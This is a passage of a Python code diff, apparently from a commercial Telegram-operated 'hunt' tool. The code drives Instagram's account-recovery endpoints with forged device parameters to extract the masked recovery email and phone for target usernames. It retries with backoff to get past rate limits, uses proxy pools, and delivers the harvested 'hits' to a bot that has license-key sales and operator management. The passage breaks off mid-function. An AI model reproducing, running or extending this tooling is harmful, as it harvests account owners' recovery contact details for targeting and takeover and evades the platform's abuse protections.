+        '\\"login_entry_point\\":\\"account_recovery\\"},'
+        '\\"client_input_params\\":{\\"zero_balance_state\\":\\"\\",\\"android_build_type\\":\\"\\",'
+        '\\"cloud_trust_token\\":null,\\"network_bssid\\":null,'
+        '\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
+    )
+
+
+def _wbloks_step3_email_params(context_data, qpl_instance_id):
+    return (
+        '{"params":"{\\"server_params\\":{\\"device_id\\":\\"'
+        + _WBLOKS_DEVICE_ID
+        + '\\",\\"event_request_id\\":\\"'
+        + str(uuid.uuid4())
+        + '\\",\\"is_auth_method_rejected\\":1,\\"context_data\\":\\"'
+        + context_data
+        + '\\",\\"INTERNAL__latency_qpl_marker_id\\":36707139,'
+        '\\"INTERNAL__latency_qpl_instance_id\\":\\"'
+        + qpl_instance_id
+        + '\\",\\"family_device_id\\":null,\\"waterfall_id\\":null,'
+        '\\"offline_experiment_group\\":null,\\"layered_homepage_experiment_group\\":null,'
+        '\\"is_platform_login\\":0,\\"is_from_logged_in_switcher\\":0,\\"is_from_logged_out\\":0,'
+        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
+        '\\"login_entry_point\\":\\"account_recovery\\"},'
+        '\\"client_input_params\\":{\\"zero_balance_state\\":\\"\\",\\"android_build_type\\":\\"\\",'
+        '\\"cloud_trust_token\\":null,\\"network_bssid\\":null,'
+        '\\"lois_settings\\":{\\"lois_token\\":\\"\\"},\\"aac\\":\\"\\"}}"}'
+    )
+
+
+def _wbloks_step4_params(context_data, screen_id):
+    return (
+        '{"params":"{\\"server_params\\":{\\"device_id\\":\\"'
+        + _WBLOKS_DEVICE_ID
+        + '\\",\\"is_platform_login\\":0,\\"is_from_logged_out\\":0,'
+        '\\"access_flow_version\\":\\"pre_mt_behavior\\",\\"login_surface\\":\\"account_recovery\\",'
+        '\\"login_entry_point\\":\\"account_recovery\\",\\"context_data\\":\\"'
+        + context_data
+        + '\\",\\"back_nav_action\\":\\"BACK\\",\\"INTERNAL_INFRA_screen_id\\":\\"'
+        + screen_id
+        + '\\"},\\"client_input_params\\":{\\"lois_settings\\":{\\"lois_token\\":\\"\\"},'
+        '\\"machine_id\\":\\"\\",\\"zero_balance_state\\":\\"\\",\\"aac\\":\\"\\"}}"}'
+    )
+
+
+def _wbloks_ig_failed(text, status_code=200):
+    """Detect IG throttle/generic failure without false positives on huge ok payloads."""
+    body = _wbloks_strip_json(text)
+    if not body or body.startswith("<!DOCTYPE"):
+        return True, "invalid_response"
+    if int(status_code or 0) == 429:
+        return True, "rate_limited"
+    if re.search(r'"error"\s*:\s*[1-9]\d*', body):
+        return True, "rate_limited"
+    if '"errorSummary"' in body and "|arm" not in body:
+        return True, "invalid_response"
+    return False, ""
+
+
+def _wbloks_hunt_backoff():
+    """Brief pause when hunt floods IG — reduces invalid_response during hits."""
+    with _hunt_inflight_lock:
+        inflight = int(_hunt_inflight)
+    if inflight >= 32:
+        time.sleep(8.0)
+    elif inflight >= 20:
+        time.sleep(5.0)
+    elif inflight >= 12:
+        time.sleep(2.5)
+
+
+_wbloks_http = requests.Session()
+
+
+def _wbloks_run_recovery_once(username):
+    """Single wbloks attempt — 4-step IG recovery."""
+    started = time.perf_counter()
+    contacts = {"email": None, "phone": None}
+
+    def merge_resp(text):
+        e = _wbloks_masked_email(text)
+        p = _wbloks_masked_phone(text)
+        if e:
+            contacts["email"] = e
+        if p:
+            contacts["phone"] = p
+
+    boot = _wbloks_bootstrap()
+    if boot.get("rate_limited") or not boot.get("lsd") or not boot.get("fb_dtsg"):
+        err = "rate_limited" if boot.get("rate_limited") or boot.get("status_code") == 429 else "session_bootstrap_failed"
+        return {
+            "ok": False,
+            "username": username,
+            "flow": "unknown",
+            "email": None,
+            "phone": None,
+            "error": err,
+            "response_time_ms": round((time.perf_counter() - started) * 1000),
+        }
+
+    r1 = _wbloks_post(
+        boot,
+        appid=_WBLOKS_SEARCH_APPID,
+        req_type="action",
+        params_json=_wbloks_step1_params(username),
+        req_id="j",
+        wd="450x1231",
+        step=1,
+    )
+    body1 = _wbloks_strip_json(r1.text)
+    failed, fail_err = _wbloks_ig_failed(r1.text, r1.status_code)
+    if failed:
+        return {
+            "ok": False,
+            "username": username,
+            "flow": "unknown",
+            "email": None,
+            "phone": None,
+            "error": fail_err,
+            "response_time_ms": round((time.perf_counter() - started) * 1000),
+        }
+
+    context_token = _wbloks_arm_token(r1.text)
+    if not context_token:
+        return {
+            "ok": False,
+            "username": username,
+            "flow": "unknown",
+            "email": None,
+            "phone": None,
+            "error": "search_failed",
+            "response_time_ms": round((time.perf_counter() - started) * 1000),
+        }
+
+    step2_appid, step2_screen_id = _wbloks_step2_route(r1.text)
+    dual = step2_appid == _WBLOKS_AUTH_METHOD_APPID
+    flow = "dual_auth" if dual else "email_confirmation"
+
+    r2 = _wbloks_post(
+        boot,
+        appid=step2_appid,
+        req_type="app",
+        params_json=_wbloks_step2_params(context_token, step2_screen_id),
+        req_id="h",
+        wd="450x908",
+        step=2,
+    )
+    merge_resp(r2.text)
+    context_token = _wbloks_arm_token(r2.text) or context_token
+    step2_arm = context_token or ""
+
+    if dual:
+        opts = _wbloks_auth_options(r2.text)
+        auth_m, async_t, rejected = _wbloks_pick_step3(opts, r2.text)
+        if not async_t:
+            async_t = _wbloks_auth_async_params(r2.text) or ""
+        step3_appid = _WBLOKS_AUTH_METHOD_ASYNC_APPID
+        step3_json = _wbloks_step3_dual_params(context_token or "", auth_m, rejected, async_t)
+    else:
+        step3_appid = _WBLOKS_EMAIL_CONFIRM_ASYNC_APPID
+        qpl = _wbloks_qpl_instance(r2.text) or "7694035200197"
+        step3_json = _wbloks_step3_email_params(step2_arm, qpl)
+
+    r3 = _wbloks_post(
+        boot,
+        appid=step3_appid,
+        req_type="action",
+        params_json=step3_json,
+        req_id="k",
+        wd="450x908",
+        step=2,
+    )
+    merge_resp(r3.text)
+    context_token = _wbloks_arm_token(r3.text) or context_token
+    step4_screen = _wbloks_step4_screen(r3.text) or "19w3pw:2"
+    step4_ctx = context_token or step2_arm
+
+    r4 = _wbloks_post(
+        boot,
+        appid=_WBLOKS_INITIATE_VIEW_APPID,
+        req_type="app",
+        params_json=_wbloks_step4_params(step4_ctx or "", step4_screen),
+        req_id="l",
+        wd="450x908",
+        step=2,
+    )
+    merge_resp(r4.text)
+
+    ok = bool(contacts["email"] or contacts["phone"])
+    result = {
+        "ok": ok,
+        "username": username,
+        "flow": flow,
+        "email": contacts["email"],
+        "phone": contacts["phone"],
+        "response_time_ms": round((time.perf_counter() - started) * 1000),
+    }
+    if not ok:
+        result["error"] = "no_contacts_found"
+    return result
+
+
+_WBLOKS_RETRY_ATTEMPTS = 5
+_WBLOKS_RETRY_SLEEP_SEC = 2.0
+_WBLOKS_RETRYABLE_ERRORS = frozenset({
+    "session_bootstrap_failed",
+    "rate_limited",
+    "invalid_response",
+    "network_error",
+})
+_HIT_CONTACT_FETCH_ATTEMPTS = 6 if not _IS_TERMUX else 4
+_HIT_CONTACT_FETCH_SLEEP_SEC = 3.0
+_HIT_CONTACT_BG_RETRY_ATTEMPTS = 8 if not _IS_TERMUX else 6
+_HIT_CONTACT_BG_RETRY_SLEEP_SEC = 12.0
+_DEFINITIVE_RECOVERY_ERRORS = frozenset({
+    "no_contacts_found",
+    "no_contact",
+    "ig_failed",
+    "account_not_found",
+    "user_not_found",
+})
+_RECOVERY_TRANSIENT_API_MARKERS = (
+    "timeout", "timed out", "connection", "network", "unreachable",
+    "offline", "refused", "reset", "502", "503", "504", "broken pipe",
+    "name resolution", "eof", "ssl", "api offline", "temporarily",
+)
+
+
+def _recovery_result_transient(data=None, api_err=None):
+    """True when failure is likely network/API — not a firm IG empty result."""
+    if api_err:
+        s = str(api_err).lower()
+        if any(m in s for m in _RECOVERY_TRANSIENT_API_MARKERS):
+            return True
+        if _recovery_api_needs_fallback(api_err):
+            return True
+        return False
+    if not isinstance(data, dict):
+        return True
+    if data.get("ok") or data.get("email") or data.get("phone"):
+        return False
+    err = (data.get("error") or "").strip()
+    if err in _WBLOKS_RETRYABLE_ERRORS:
+        return True
+    if err in _DEFINITIVE_RECOVERY_ERRORS:
+        return False
+    return not err
+
+
+def _wbloks_run_recovery(username):
+    """Wbloks with 3 attempts / 2s pause on network or bootstrap blips."""
+    started = time.perf_counter()
+    last = None
+    for attempt in range(1, _WBLOKS_RETRY_ATTEMPTS + 1):
+        try:
+            result = _wbloks_run_recovery_once(username)
+        except requests.RequestException as exc:
+            result = {
+                "ok": False,
+                "username": username,
+                "flow": "unknown",
+                "email": None,
+                "phone": None,
+                "error": "network_error",
+                "detail": str(exc)[:120],
+                "attempt": attempt,
+            }
+        last = result
+        if result.get("ok"):
+            if attempt > 1:
+                result["retries"] = attempt - 1
+            result["response_time_ms"] = round((time.perf_counter() - started) * 1000)
+            return result
+        err = (result.get("error") or "").strip()
+        if attempt >= _WBLOKS_RETRY_ATTEMPTS or err not in _WBLOKS_RETRYABLE_ERRORS:
+            break
+        time.sleep(_WBLOKS_RETRY_SLEEP_SEC * attempt)
+    if last is None:
+        last = {
+            "ok": False,
+            "username": username,
+            "flow": "unknown",
+            "email": None,
+            "phone": None,
+            "error": "unknown",
+        }
+    if attempt > 1:
+        last["retries"] = attempt - 1
+    last["response_time_ms"] = round((time.perf_counter() - started) * 1000)
+    return last
+
+def _apply_wbloks_recovery_to_hit_out(out, recovery):
+    """Merge run_recovery JSON into hit contact fields (IG-masked as returned)."""
+    if not isinstance(recovery, dict):
+        return out
+    email = (recovery.get("email") or "").strip()
+    phone = (recovery.get("phone") or "").strip()
+    if email and _is_valid_ig_recovery_email(email) and not out.get("email"):
+        out["email"] = email
+    if phone and _is_valid_ig_recovery_phone(phone) and not out.get("phone"):
+        out["phone"] = phone
+    return out
+
+
+def _pull_hit_contact_recovery(
+    uname, ig_info=None, *, read_timeout=None,
+):
+    """Single /ig_recovery pull via local endpoint. Returns (merged_out, data, api_err)."""
+    out = _hit_contact_seed_from_info(ig_info)
+    data = None
+    err = None
+    api_read = read_timeout or _HIT_RECOVERY_API_READ_TIMEOUT
+    try:
+        data, err = api_fetch_json(
+            HUNT_IG_RECOVERY_ROUTE,
+            {"username": uname},
+            timeout=(HUNT_CONNECT_TIMEOUT, api_read),
+        )
+        if err or not isinstance(data, dict):
+            return out, data, err or "bad_json"
+        out = _apply_wbloks_recovery_to_hit_out(out, data)
+    except Exception as exc:
+        err = str(exc)[:120]
+    return out, data, err
+
+
+def _fetch_hit_contact_wbloks(username, ig_info=None, *, hunt_safe=False):
+    """IG recovery with network retries until contacts or a firm IG empty result."""
+    uname = (username or "").strip().lstrip("@")
+    out = _hit_contact_seed_from_info(ig_info)
+    if not uname:
+        return out
+    max_attempts = _HIT_CONTACT_HUNT_ATTEMPTS if hunt_safe else _HIT_CONTACT_FETCH_ATTEMPTS
+    read_timeout = _HIT_CONTACT_HUNT_READ_TIMEOUT if hunt_safe else _HIT_RECOVERY_API_READ_TIMEOUT
+    sleep_sec = 2.0 if hunt_safe else _HIT_CONTACT_FETCH_SLEEP_SEC
+    last_data = None
+    last_err = None
+    for attempt in range(1, max_attempts + 1):
+        trial_out, data, err = _pull_hit_contact_recovery(
+            uname, ig_info,
+            read_timeout=read_timeout,
+        )
+        out = trial_out
+        last_data, last_err = data, err
+        if out.get("email") or out.get("phone"):
+            log_event(
+                "HIT ENRICH",
+                f"@{uname} recovery ok · "
+                f"email={'Y' if out.get('email') else 'N'} "
+                f"phone={'Y' if out.get('phone') else 'N'}"
+                + (f" · retry #{attempt - 1}" if attempt > 1 else "")
+                + (" · hunt-safe" if hunt_safe else ""),
+            )
+            return out
+        if not _recovery_result_transient(data, err):
+            err_code = (data or {}).get("error") if isinstance(data, dict) else err
+            retries = (data or {}).get("retries") if isinstance(data, dict) else None
+            extra = f" after {retries} retries" if retries else ""
+            log_event("HIT ENRICH", f"@{uname} recovery empty ({err_code or 'no_contact'}{extra})")
+            return out
+        if attempt < max_attempts:
+            wait = sleep_sec * attempt
+            log_event(
+                "HIT ENRICH",
+                f"@{uname} recovery transient ({(data or {}).get('error') or err or 'network'}) "
+                f"· retry {attempt}/{max_attempts} in {wait:.0f}s"
+                + (" · hunt-safe" if hunt_safe else ""),
+            )
+            time.sleep(wait)
+    log_event(
+        "HIT ENRICH",
+        f"@{uname} recovery still transient after {max_attempts} pulls "
+        f"({(last_data or {}).get('error') or last_err or 'network'})"
+        + (" · defer bg retry" if hunt_safe else ""),
+    )
+    return out
+
+
+def _hit_contact_seed_from_info(ig_info):
+    out = {}
+    joined = _joined_year_from_ig_info(ig_info)
+    if joined:
+        out["joined"] = joined
+    return out
+
+
+def _hit_contact_log_proxy_pool_once():
+    global _hit_proxy_boot_logged
+    if _hit_proxy_boot_logged:
+        return
+    pool = get_hit_proxy_pool()
+    if pool and len(pool):
+        log_event("HIT PROXY", f"{len(pool)} embedded hit proxies")
+    _hit_proxy_boot_logged = True
+
+
+def _fetch_hit_contact_direct_then_proxy(username, ig_info=None, *, hunt_slot=False):
+    """Masked email/phone via wbloks recovery (replaces graphql/mobile enrich)."""
+    uname = (username or "").strip().lstrip("@")
+    if not uname:
+        return _hit_contact_seed_from_info(ig_info)
+    return _fetch_hit_contact_wbloks(uname, ig_info, hunt_safe=hunt_slot)
+
+
+def _fetch_hit_contact_fast(username, ig_info=None):
+    """Wbloks recovery for hit enrich."""
+    return _fetch_hit_contact_wbloks(username, ig_info)
+
+
+def _fetch_hit_contact_mobile(username, ig_info=None, existing=None):
+    """Retry wbloks when first pass missed email or phone."""
+    uname = (username or "").strip().lstrip("@")
+    out = dict(existing or _hit_contact_seed_from_info(ig_info))
+    if not uname or (out.get("email") and out.get("phone")):
+        return out
+    return _fetch_hit_contact_wbloks(uname, ig_info)
+
+
+def _fetch_hit_contact_details(username, ig_info=None):
+    """Wbloks recovery — single path for hit contact section."""
+    return _fetch_hit_contact_wbloks(username, ig_info)
+
+
+def _parse_tg_message_id(response):
+    if response is None or not getattr(response, "ok", False):
+        return None
+    try:
+        return response.json().get("result", {}).get("message_id")
+    except Exception:
+        return None
+
+
+def _format_hit_contact_section(username, ig_info=None, details=None):
+    """Joined year + real IG recovery email/phone only (no fake placeholders)."""
+    if details is None:
+        details = _fetch_hit_contact_details(username, ig_info)
+    joined = (details.get("joined") or "").strip()
+    email = (details.get("email") or "").strip()
+    phone = (details.get("phone") or "").strip()
+    header = _hit_recovery_section_header()
+    if not (joined or email or phone):
+        return (
+            header
+            + f"  {S['bullet']} Email     <code>—</code>\n"
+            + f"  {S['bullet']} Phone     <code>—</code>\n"
+            + f"  {S['bullet']} Joined    <code>—</code>\n"
+        )
+    lines = [header]
+    if email:
+        lines.append(f"  {S['bullet']} Email     <code>{html.escape(email)}</code>\n")
+    else:
+        lines.append(f"  {S['bullet']} Email     <code>—</code>\n")
+    if phone:
+        lines.append(f"  {S['bullet']} Phone     <code>{html.escape(phone)}</code>\n")
+    else:
+        lines.append(f"  {S['bullet']} Phone     <code>—</code>\n")
+    if joined:
+        lines.append(f"  {S['bullet']} Joined    <code>{html.escape(joined)}</code>\n")
+    return "".join(lines)
+
+
+def telegram_disable_link_preview(data, method):
+    """No URL preview cards under messages or photo captions."""
+    if method in ("sendMessage", "editMessageText"):
+        data["disable_web_page_preview"] = True
+    elif method in ("sendPhoto", "editMessageCaption", "sendDocument"):
+        data["link_preview_options"] = json.dumps({"is_disabled": True})
+    return data
+
+
+def append_error_log(source, message, details=None):
+    """Persistent error log for Telegram / hunt failures."""
+    ts = datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
+    with _log_file_lock:
+        with open(ERROR_LOG_PATH, "a", encoding="utf-8") as f:
+            f.write(f"[{ts}] [{source}] {message}\n")
+            if details:
+                f.write(f"{details}\n")
+            f.write("-" * 72 + "\n")
+
+
+def telegram_post_with_retries(
+    method,
+    data=None,
+    files=None,
+    params=None,
+    timeout=None,
+    *,
+    max_retries=TG_HIT_MAX_RETRIES,
+    label="TG",
+    fail_fast_400=False,
+):
+    if not TELEGRAM_ENABLED or not TELEGRAM_API_URL:
+        return None
+    if data is None:
+        data = {}
+    if "reply_markup" in data and not isinstance(data["reply_markup"], str):
+        data["reply_markup"] = json.dumps(data["reply_markup"])
+    data = telegram_disable_link_preview(data, method)
+    if timeout is None:
+        timeout = TG_POLL_HTTP_TIMEOUT if method == "getUpdates" else TG_SEND_TIMEOUT
+
+    url = f"{TELEGRAM_API_URL}/{method}"
+    last_err = "unknown"
+    for attempt in range(1, max_retries + 1):
+        try:
+            response = requests.post(
+                url, data=data, files=files, params=params, timeout=timeout,
+            )
+            if response.ok:
+                if attempt > 1:
+                    log_event(label, f"OK after {attempt} tries")
+                return response
+            last_err = f"HTTP {response.status_code}: {response.text[:200]}"
+            if response.status_code == 429 and attempt < max_retries:
+                wait = min(35.0, TG_HIT_RETRY_BASE_SEC * attempt * 3)
+                log_event(f"{label} RETRY", f"rate limit · wait {wait:.0f}s")
+                time.sleep(wait)
+                continue
+            if fail_fast_400 and response.status_code == 400:
+                try:
+                    desc = response.json().get("description", "").lower()
+                    if "message is not modified" in desc:
+                        return response
+                except Exception:
+                    pass
+                log_event(f"{label} FAIL", last_err[:100])
+                return None
+        except Exception as exc:
+            last_err = str(exc)
+
+        if attempt < max_retries:
+            wait = min(TG_HIT_RETRY_BASE_SEC * attempt, 12.0)
+            log_event(
+                f"{label} RETRY",
+                f"{attempt}/{max_retries} {last_err[:72]} · wait {wait:.0f}s",
+            )
+            time.sleep(wait)
+
+    log_event(f"{label} FAIL", last_err[:100])
+    return None
+
+
+def send_telegram_request(method, data=None, files=None, params=None, timeout=None, *, max_retries=TG_CMD_MAX_RETRIES):
+    return telegram_post_with_retries(
+        method, data, files, params, timeout, max_retries=max_retries, label="TG",
+    )
+
+
+def send_telegram_instant(text, *, chat_id=None, reply_markup=None, parse_mode="HTML"):
+    """Sub-second Telegram send for command acks — never block on hunt-style retries."""
+    if not TELEGRAM_ENABLED:
+        return None
+    target = str(chat_id or TELEGRAM_CHAT_ID or "").strip()
+    if not target:
+        return None
+    payload = {"chat_id": target, "text": text, "parse_mode": parse_mode}
+    if reply_markup is not None:
+        payload["reply_markup"] = reply_markup
+    return telegram_post_with_retries(
+        "sendMessage",
+        payload,
+        timeout=TG_INSTANT_TIMEOUT,
+        max_retries=TG_INSTANT_MAX_RETRIES,
+        label="TG INST",
+    )
+
+
+def telegram_poll_get_updates(offset):
+    """Single long-poll call — no retry backoff (retrying getUpdates causes multi-minute lag)."""
+    if not TELEGRAM_ENABLED or not TELEGRAM_API_URL:
+        return None
+    try:
+        return requests.post(
+            f"{TELEGRAM_API_URL}/getUpdates",
+            data={
+                "timeout": 20,
+                "offset": offset,
+                "allowed_updates": json.dumps(["message", "callback_query", "my_chat_member"]),
+            },
+            timeout=TG_POLL_HTTP_TIMEOUT,
+        )
+    except Exception as exc:
+        log_event("TG POLL", str(exc)[:80])
+        return None
+
+
+def deliver_hit_to_telegram(caption, hit_keyboard, photo_bytes=None, content_type="image/jpeg"):
+    """Send hit alert with up to TG_HIT_MAX_RETRIES — never give up on first network blip."""
+    if not TELEGRAM_ENABLED:
+        return False
+
+    if photo_bytes:
+        data = {
+            "chat_id": TELEGRAM_CHAT_ID,
+            "caption": caption,
+            "parse_mode": "HTML",
+            "reply_markup": json.dumps(hit_keyboard),
+        }
+        data = telegram_disable_link_preview(data, "sendPhoto")
+        files = {"photo": ("profile.jpg", photo_bytes, content_type)}
+        resp = telegram_post_with_retries(
+            "sendPhoto",
+            data=data,
+            files=files,
+            timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
+            max_retries=TG_HIT_MAX_RETRIES,
+            label="HIT PHOTO",
+        )
+        if resp is not None:
+            return True
+
+    text_data = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": caption,
+        "parse_mode": "HTML",
+        "reply_markup": json.dumps(hit_keyboard),
+    }
+    text_data = telegram_disable_link_preview(text_data, "sendMessage")
+    resp = telegram_post_with_retries(
+        "sendMessage",
+        data=text_data,
+        timeout=max(TIMEOUT, TG_SEND_TIMEOUT),
+        max_retries=TG_HIT_MAX_RETRIES,
+        label="HIT MSG",
+    )
+    return resp is not None
+
+
+def ensure_telegram_polling_mode():
+    """Long-poll needs no webhook; avoids 'bot dead' when webhook + poll clash."""
+    if not TELEGRAM_API_URL:
+        return
+    try:
+        requests.get(
+            f"{TELEGRAM_API_URL}/deleteWebhook",
+            params={"drop_pending_updates": "false"},
+            timeout=5,
+        )
+    except Exception:
+        pass
+
+
+def _normalize_bot_command_menu(items):
+    menu = []
+    for cmd, desc in items:
+        cmd = re.sub(r"[^a-z0-9_]", "", (cmd or "").lower())[:32]
+        desc = (desc or cmd)[:256]
+        if len(cmd) >= 1 and len(desc) >= 3:
+            menu.append({"command": cmd, "description": desc})
+    return menu[:100]
+
+
+def build_telegram_command_menu(*, include_admin=False):
+    """Slash-menu entries for private chats (Telegram / suggestions)."""
+    items = [
+        ("start", "Welcome panel & dashboard"),
+        ("stats", "Live hunt dashboard"),
+        ("status", "Quick status snapshot"),
+        ("check", "Health check — why 0 generated?"),
+        ("verify", "Verify joins & unlock access"),
+        ("mylicense", "License expiry & status"),
+        ("plan", "Free trial & daily usage"),
+        ("redeem", "Activate Premium license key"),
+        ("hitgroup", "Hit group status (DM)"),
+        ("pause", "Pause workers"),
+        ("resume", "Resume hunt"),
+        ("hits", "Recent captures"),
+        ("saved", "Favorites list & file"),
+        ("profile", "Operator profile"),
+        ("leaderboard", "Global rankings"),
+        ("badges", "Achievements"),
+        ("settings", "Min followers · timeout · threads"),
+        ("analytics", "Deep session stats"),
+        ("health", "Backend health check"),
+        ("api", "API gateway probe"),
+        ("cloud", "Supabase sync status"),
+        ("export", "Send hits.txt file"),
+        ("live", "Auto-refresh on or off"),
+        ("reset", "Reset session counters"),
+        ("logout", "Log out (confirmation)"),
+        ("lookup", "Gmail / Instagram lookup"),
+        ("gen", "Generate usernames"),
+        ("help", "Full command guide"),
+    ]
+    if include_admin:
+        items.extend([
+            ("admin", "Admin overview"),
+            ("adminhelp", "Admin command guide"),
+            ("set", "Cloud & bot settings"),
+            ("force", "Add force-join channel"),
+            ("forcelist", "List force-join targets"),
+            ("forcedel", "Remove force-join target"),
+            ("ban", "Ban operator"),
+            ("unban", "Unban operator"),
+            ("users", "List operators"),
+            ("broadcast", "Message all operators"),
+            ("adminstats", "Platform statistics"),
+            ("rebrand", "Rebrand operator bots"),
+            ("licensegen", "Generate license key"),
+            ("grant", "Grant license to user ID"),
+            ("revoke", "Revoke user license"),
+            ("licenseinfo", "License info for user"),
+            ("licenses", "List active licenses"),
+            ("licensekeys", "List unused keys"),
+        ])
+    return _normalize_bot_command_menu(items)
+
+
+def build_telegram_group_command_menu():
+    """Slash suggestions inside groups (hit group setup)."""
+    return _normalize_bot_command_menu([
+        ("check", "Health check — why 0 generated?"),
+        ("hitgroup", "Link this group for hits"),
+        ("setgroup", "Same as hitgroup"),
+        ("verifyhitgroup", "Confirm bot is admin here"),
+        ("check", "Health check & friendly fixes"),
+        ("stats", "Live dashboard"),
+        ("status", "Quick status"),
+        ("help", "Command guide"),
+    ])
+
+
+def _telegram_set_commands(commands, scope):
+    if not TELEGRAM_API_URL or not commands:
+        return False
+    try:
+        response = requests.post(
+            f"{TELEGRAM_API_URL}/setMyCommands",
+            data={
+                "commands": json.dumps(commands),
+                "scope": json.dumps(scope),
+            },
+            timeout=10,
+        )
+        if response.ok:
+            return True
+        log_event("TG CMDS", f"{scope.get('type')}: {response.text[:80]}")
+    except Exception as exc:
+        log_event("TG CMDS", str(exc)[:100])
+    return False
+
+
+def sync_telegram_command_menu(user_id=None):
+    """Push / menu to Telegram (private + group scopes)."""
+    if not TELEGRAM_API_URL:
+        return False
+    user_id = str(user_id or TELEGRAM_CHAT_ID or "").strip()
+    if not user_id or not user_id.lstrip("-").isdigit():
+        return False
+    try:
+        admin_load_settings()
+        include_admin = admin_is_admin(user_id)
+        private_cmds = build_telegram_command_menu(include_admin=include_admin)
+        operator_cmds = build_telegram_command_menu(include_admin=False)
+        group_cmds = build_telegram_group_command_menu()
+        ok = True
+        ok = _telegram_set_commands(operator_cmds, {"type": "default"}) and ok
+        ok = _telegram_set_commands(operator_cmds, {"type": "all_private_chats"}) and ok
+        ok = _telegram_set_commands(group_cmds, {"type": "all_group_chats"}) and ok
+        ok = _telegram_set_commands(
+            private_cmds,
+            {"type": "chat", "chat_id": int(user_id)},
+        ) and ok
+        if include_admin:
+            admin_cmds = build_telegram_command_menu(include_admin=True)
+            ok = _telegram_set_commands(
+                admin_cmds,
+                {"type": "chat", "chat_id": int(user_id)},
+            ) and ok
+        return ok
+    except Exception as exc:
+        log_event("TG CMDS", str(exc)[:100])
+    return False
+
+
+def schedule_sync_telegram_commands(user_id=None):
+    """Background — never block poll or command replies."""
+    if not TELEGRAM_API_URL:
+        return
+    uid = str(user_id or TELEGRAM_CHAT_ID or "").strip()
+    if not uid:
+        return
+    threading.Thread(
+        target=sync_telegram_command_menu,
+        args=(uid,),
+        daemon=True,
+    ).start()
+
+
+def send_telegram_text(text, reply_markup=None, parse_mode="HTML", *, chat_id=None):
+    if not TELEGRAM_ENABLED:
+        return None
+    target = str(chat_id or TELEGRAM_CHAT_ID or "").strip()
+    if not target:
+        return None
+    payload = {
+        "chat_id": target,
+        "text": text,
+        "parse_mode": parse_mode,
+    }
+    if reply_markup is not None:
+        payload["reply_markup"] = reply_markup
+    return send_telegram_request("sendMessage", data=payload)
+
+
+def send_telegram_text_to_chat(chat_id, text, reply_markup=None):
+    return send_telegram_text(text, reply_markup=reply_markup, chat_id=chat_id)
+
+
+def telegram_sent_message_id(response):
+    if response is None or not response.ok:
+        return None
+    try:
+        return response.json().get("result", {}).get("message_id")
+    except Exception:
+        return None
+
+
+def remember_startup_panel(chat_id=None, message_id=None, response=None, has_photo=None):
+    """Welcome photo/text on boot — only /start refreshes this, not slash commands."""
+    if response is not None:
+        message_id = telegram_sent_message_id(response) or message_id
+        if has_photo is None and response.ok:
+            try:
+                result = response.json().get("result") or {}
+                has_photo = bool(result.get("photo"))
+            except Exception:
+                pass
+    if chat_id is None:
+        chat_id = TELEGRAM_CHAT_ID
+    if message_id:
+        STARTUP_PANEL["chat_id"] = str(chat_id)
+        STARTUP_PANEL["message_id"] = message_id
+    if has_photo is not None:
+        STARTUP_PANEL["has_photo"] = bool(has_photo)
+
+
+def _panel_is_startup_target(chat_id, message_id):
+    if not chat_id or not message_id:
+        return False
+    return (
+        str(chat_id) == str(STARTUP_PANEL.get("chat_id"))
+        and message_id == STARTUP_PANEL.get("message_id")
+    )
+
+
+def remember_cmd_panel(chat_id=None, message_id=None, response=None):
+    """Track last dashboard panel so operator commands can edit in place (not startup)."""
+    is_photo = False
+    if response is not None:
+        message_id = telegram_sent_message_id(response) or message_id
+        if response.ok:
+            try:
+                result = response.json().get("result") or {}
+                is_photo = bool(result.get("photo"))
+            except Exception:
+                pass
+    if chat_id is None:
+        chat_id = TELEGRAM_CHAT_ID
+    if message_id:
+        if _panel_is_startup_target(chat_id, message_id):
+            return
+        CMD_REPLY_PANEL["chat_id"] = str(chat_id)
+        CMD_REPLY_PANEL["message_id"] = message_id
+        CMD_REPLY_PANEL["is_photo"] = is_photo
+
+
+def _sync_live_panel_from_reply_markup(reply_markup):
+    if not reply_markup:
+        return
+    for row in reply_markup.get("inline_keyboard", []):
+        for btn in row:
+            if btn.get("callback_data") in LIVE_DASHBOARD_CALLBACKS:
+                remember_cmd_panel(
+                    CMD_REPLY_PANEL.get("chat_id"),
+                    CMD_REPLY_PANEL.get("message_id"),
+                )
+                LIVE_PANEL["chat_id"] = CMD_REPLY_PANEL["chat_id"]
+                LIVE_PANEL["message_id"] = CMD_REPLY_PANEL["message_id"]
+                LIVE_PANEL["view"] = "stats"
+                return
+
+
+def _set_operator_cmd_context(chat_id=None, chat_type=None, actor_id=None):
+    _operator_cmd_ctx.reply_chat_id = str(chat_id) if chat_id else None
+    _operator_cmd_ctx.chat_type = chat_type or "private"
+    _operator_cmd_ctx.actor_id = str(actor_id) if actor_id else None
+
+
+def _clear_operator_cmd_context():
+    _operator_cmd_ctx.reply_chat_id = None
+    _operator_cmd_ctx.chat_type = None
+    _operator_cmd_ctx.actor_id = None
+
+
+def operator_reply_chat_id():
+    cid = getattr(_operator_cmd_ctx, "reply_chat_id", None)
+    return str(cid) if cid else str(TELEGRAM_CHAT_ID or "")
+
+
+def operator_command_in_group():
+    return getattr(_operator_cmd_ctx, "chat_type", None) in ("group", "supergroup")
+
+
+def is_linked_operator(user_id):
+    op = resolve_operator_telegram_id()
+    return bool(op and str(user_id or "").strip() == str(op).strip())
+
+
+def can_control_operator_bot(user_id):
+    """Linked operator or INPARETO admin may use this operator bot."""
+    user_id = str(user_id or "").strip()
+    if not user_id:
+        return False
+    if is_linked_operator(user_id):
+        return True
+    return admin_is_admin(user_id)
+
+
+def _track_operator_cmd_panel(chat_id, actor=None):
+    cid = str(chat_id or "")
+    if cid == str(TELEGRAM_CHAT_ID or ""):
+        return True
+    if actor and admin_is_admin(actor) and cid == str(actor):
+        return True
+    return False
+
+
+def normalize_bot_command_text(text):
+    """Strip /cmd@BotName → /cmd so group commands work with BotFather privacy."""
+    raw = (text or "").strip()
+    if not raw or not raw.startswith("/"):
+        return raw
+    parts = raw.split()
+    token = parts[0]
+    if "@" in token:
+        parts[0] = token.split("@", 1)[0]
+        return " ".join(parts)
+    return raw
+
+
+def bot_command_reply(text, reply_markup=None, *, remove_markup=False, chat_id=None, **_legacy):
